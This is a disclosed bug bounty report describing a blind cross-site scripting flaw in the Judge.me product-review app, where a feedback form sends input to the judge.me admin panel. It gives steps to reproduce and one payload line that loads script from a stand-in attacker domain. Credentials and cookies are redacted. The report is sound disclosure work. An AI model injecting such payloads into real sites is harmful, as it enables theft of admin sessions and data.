# Blind XSS via Feedback form.

## Report Details
- **Report ID**: 1339034
- **URL**: https://hackerone.com/reports/1339034
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-09-14T02:50:57.719Z
- **Disclosed**: 2022-05-03T09:36:36.383Z

## Reporter
- **Username**: b3hlull
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: judgeme

## Vulnerability Information
## Summary:

Hi Team,

 I found Blind XSS which is triggered on the admin panel. I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload. It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages.

## Steps To Reproduce:

  1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials.** (credentials in the Credentials Header)**
  1. Click the **Apps** tab from the left side and then click **Judge.me Product Reviews**.
  1. Click** Add Widgets** then **Start Installation** and continue.
  1. When the installation is done. It asks **Are you happy with how everything looks?**. Choose  **No, please remove all widgets button**. Feedback form appears and put your blind xss payload.
  1. Wait for payload triggering.

## Supporting Material/References:

Vulnerable Page URL : https://judge.me/admin/████████
Referer: https://judge.me/admin/███

Cookies:```http
██████████████ ```


## Credentials

```http
email:  ██████████@yopmail.com
password: ███████
tempmail: https://yopmail.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

 Admin Page
=====================
█████
Vulnerable Page
=====================
███████ 
Steps to Reproduce Video
=====================
████

## Impact

Blind XSS leads to access the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies.

## Attachments
No attachments
